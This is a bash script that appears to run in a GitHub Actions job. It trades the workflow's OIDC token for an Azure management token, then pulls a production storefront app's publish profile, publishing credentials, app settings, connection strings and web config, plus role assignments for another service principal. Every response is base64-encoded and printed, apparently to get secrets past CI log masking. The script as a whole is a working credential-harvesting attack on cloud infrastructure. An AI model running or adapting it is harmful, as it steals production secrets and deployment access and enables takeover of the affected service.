#!/bin/bash
set -e

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

# Management token
MT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
MT=$(echo "$MT_RAW" | jq -r .access_token)
echo "MT_LEN=${#MT}"

SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

# Try to get storefront publishing profile
echo "=== Storefront Publish Profile ==="
PP=$(curl -sS -w "\nHTTP:%{http_code}" -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/publishxml?api-version=2023-12-01" 2>&1)
echo "PP_B64=$(echo "$PP" | base64 -w0)"

# Try listing publish credentials
echo "=== Storefront Publish Creds ==="
PC=$(curl -sS -w "\nHTTP:%{http_code}" -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2023-12-01" 2>&1)
echo "PC_B64=$(echo "$PC" | base64 -w0)"

# Try to get storefront app settings (might contain secrets)
echo "=== Storefront App Settings ==="
AS=$(curl -sS -w "\nHTTP:%{http_code}" -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-12-01" 2>&1)
echo "AS_B64=$(echo "$AS" | base64 -w0)"

# Also try connection strings
echo "=== Storefront Connection Strings ==="
CS=$(curl -sS -w "\nHTTP:%{http_code}" -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2023-12-01" 2>&1)
echo "CS_B64=$(echo "$CS" | base64 -w0)"

# Try storefront config details
echo "=== Storefront Web Config ==="
WC=$(curl -sS -H "Authorization: Bearer $MT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2023-12-01" 2>&1)
echo "WC_B64=$(echo "$WC" | base64 -w0)"

# Also try to identify SP 70a07660 via management
echo "=== SP Identification ==="
SP_INFO=$(curl -sS -H "Authorization: Bearer $MT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'70a07660-06bb-4396-b754-59fbad0b143e'" 2>&1)
echo "SP_ROLE_B64=$(echo "$SP_INFO" | base64 -w0)"

echo "=== DONE ==="